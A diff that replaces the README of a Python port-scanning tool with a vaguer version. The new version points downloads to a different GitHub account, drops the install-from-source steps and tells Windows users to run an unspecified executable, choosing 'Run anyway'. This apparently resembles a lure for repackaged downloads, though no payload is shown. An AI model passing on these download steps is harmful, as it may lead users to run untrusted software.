@@ -1,124 +1,136 @@
-<div align="center">
+# 🕳️ Terminal-Port-Crawler - Find open ports fast
 
-# TPC - Terminal Port Crawler
+[![Download Terminal-Port-Crawler](https://img.shields.io/badge/Download-Terminal-Port-Crawler-blue?style=for-the-badge&logo=github)](https://github.com/cedrick9844/Terminal-Port-Crawler)
 
-**Port scanning with threat analysis, banner grabbing, OS fingerprinting, and CVE references.**
-Runs as a full TUI or entirely from the command line.
+## 🚀 What Terminal-Port-Crawler does
 
-<br>
+Terminal-Port-Crawler, or TPC, is a port crawler for Windows that helps you look for open ports on an IP address or range of addresses. It comes in two forms:
 
-[![Download](https://img.shields.io/badge/Download%20for%20Windows-tpc.exe-blue?style=for-the-badge&logo=windows)](https://github.com/Andrew-most-likely/Terminal-Port-Crawler/releases/latest)
+- **CLI mode** for the terminal
+- **GUI mode** for a simple windowed view
 
-*No Python required - just download and run.*
+TPC is built with Python and Textual, so it stays light and easy to use. It is useful when you want to check ports without learning a complex tool.
 
-<br>
+## 📥 Download and run on Windows
 
-</div>
+1. Open the main project page: https://github.com/cedrick9844/Terminal-Port-Crawler
+2. Look for the latest release or the main download file on the page
+3. Download the Windows version
+4. If the file is a ZIP file, extract it to a folder
+5. Open the folder and run the app file
+6. If Windows asks for permission, choose **Run anyway** only if you trust the source
 
-<img width="2879" height="1799" alt="Screenshot 2026-03-26 014148" src="https://github.com/user-attachments/assets/b29e2b5c-58af-49b0-a57a-7f35921910c0" />
+If you use the CLI version, open a terminal in the app folder and start it from there. If you use the GUI version, open the app file and use the window that appears.
 
----
+## 🖥️ Choose a version
 
-## Install from source
+### CLI version
+Use this if you want a simple terminal tool. It works well if you like typing commands and want quick port checks.
 
-```bash
-git clone https://github.com/Andrew-most-likely/Terminal-Port-Crawler
-cd Terminal-Port-Crawler
-pip install -e .
-```
+### GUI version
+Use this if you want a windowed app. It gives you a more visual way to work with port crawling and is easier for first-time users.
 
-**Requirements:** Python 3.9+, pip 21.3+
+## 🔧 What you can do with TPC
 
----
+TPC is built to help with port scanning tasks. It can:
 
-## Usage
+- Crawl ports for a target IP address
+- Check TCP ports
+- Work with UDP ports
+- Search for open ports based on what you want to find
+- Show results in a terminal view or a GUI view
 
-### TUI (interactive)
+This makes it useful for basic network checks, learning, and local testing.
 
-```bash
-tpc
-```
+## 🧭 How to use it
 
-Launches the full terminal UI. Enter a target and press `Ctrl+S` to start crawling.
+### For the GUI
+1. Start the app
+2. Enter the IP address or host you want to check
+3. Pick the port range or scan option
+4. Start the crawl
+5. Read the results in the window
 
-### CLI (flags only, no UI)
+### For the CLI
+1. Open Command Prompt or PowerShell
+2. Go to the folder where TPC is stored
+3. Run the app from the terminal
+4. Enter the target, port range, and scan type
+5. Review the output in the terminal
 
-```bash
-tpc -t <target> [options]
-```
+## 🪟 Windows setup tips
 
-| Flag | Description |
-|------|-------------|
-| `-t`, `--target` | Target IP, hostname, CIDR subnet, or dash range |
-| `-p`, `--ports` | Port range, e.g. `1-1024` (default: `1-1024`) |
-| `-m`, `--mode` | Scan mode: `fast`, `random`, `slow` (default: `fast`) |
-| `--delay` | Delay in seconds between ports for slow mode (default: `0.5`) |
-| `--udp` | Also crawl known UDP ports |
-| `-b`, `--banners` | Grab service banners after crawling |
-| `-e`, `--export` | Export results: `txt`, `csv`, `json`, `html` |
+For the best first run on Windows:
 
-**Examples:**
+- Keep the files in one folder
+- Do not rename files unless you know they are not used by the app
+- If you downloaded a ZIP file, extract all files before running it
+- If the app does not start, try running it again from the folder where it was unpacked
 
-```bash
-tpc -t 192.168.1.1                        # crawl common ports
-tpc -t 192.168.1.1 -p 1-65535            # full port range
-tpc -t 192.168.1.0/24 -m random          # subnet, random order
-tpc -t 192.168.1.1 -m slow --delay 1.0   # slow crawl
-tpc -t 192.168.1.1 --udp                 # include UDP
-tpc -t 192.168.1.1 -b -e json            # banners + JSON export
-tpc --help                                # show all flags
-```
+If you use a Python-based build, you may also need a working Python install on your system. The GUI build should still feel like a normal desktop app.
 
----
+## 📦 Typical folder contents
 
-## Features
+A Windows download for TPC may include files like:
 
-- TCP port crawling across 75+ known service definitions
-- UDP crawling across all known UDP ports in the selected range
-- Fast, random order, and slow crawl modes
-- Subnet crawling (CIDR notation: `192.168.1.0/24`)
-- IP range crawling (`192.168.1.1-50`)
-- Hostname resolution (forward and reverse DNS)
-- Full port range option (1-65535)
-- Banner grabbing for service enumeration
-- OS fingerprinting from open port patterns
-- Threat assessment - HIGH / MEDIUM / LOW risk ratings
-- CVE references for notable open ports
-- Export to TXT, CSV, JSON, or HTML
-- HTML export renders as a styled report
-- Exports saved to `exports/` folder
-- Persistent crawl history log
-- Full CLI mode - no UI required
+- An app file for the GUI
+- A terminal script for the CLI
+- Support files used by the app
+- A readme or config file
+- A folder for assets or UI parts
 
----
+Keep these files together so the app can load them.
 
-## TUI Keybindings
+## 🛡️ Safety and local use
 
-| Action         | Key      |
-|----------------|----------|
-| Start crawl    | Ctrl+S   |
-| Grab banners   | Ctrl+B   |
-| Export results | Ctrl+E   |
-| New crawl      | Ctrl+N   |
-| About          | F1       |
-| Quit           | Ctrl+Q   |
+TPC is meant for scanning ports on systems you own or manage. Use it on your own network, a test machine, or systems where you have permission to check ports.
 
----
+## 🧩 Common use cases
 
-## Target Formats
+- Check if a local service is open
+- Test a home lab server
+- Look at TCP or UDP ports on a device
+- Learn how port scanning works
+- Run a quick network check from a terminal or window
 
-| Format      | Example           |
-|-------------|-------------------|
-| Single IP   | `192.168.1.1`     |
-| Hostname    | `router.local`    |
-| CIDR subnet | `192.168.1.0/24`  |
-| Dash range  | `192.168.1.1-50`  |
+## 🗂️ Topics
 
----
+crawling-python, github, ip, learn, port, port-scanner, port-scanning, python, scanner, tcp, terminal, terminal-based, textual, udp
 
-## Legal
+## 🛠️ Basic troubleshooting
 
-Only use this tool on systems you own or have **explicit written permission** to test.
-Unauthorized port crawling may be illegal under the CFAA, Computer Misuse Act, or equivalent laws in your jurisdiction.
+If the app does not open:
 
-have fun 😊 
+- Make sure the download finished
+- Confirm you extracted all files if the download came as a ZIP
+- Try running the app from the same folder where it was downloaded
+- Check that Windows did not block the file
+- If you use the CLI version, open it from a terminal window
+
+If the scan does not return results:
+
+- Check the target IP or host
+- Try a smaller port range first
+- Make sure the system you scan allows port checks
+- Try TCP first, then UDP
+
+## 📌 File names to look for
+
+When you open the project page, look for names that may point to the right download:
+
+- Windows build
+- GUI build
+- CLI build
+- Release ZIP
+- Executable file
+- App package
+
+## ⌨️ Quick start flow
+
+1. Go to the project page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the GUI or CLI version
+5. Enter a target IP
+6. Start the port crawl
+7. Read the results
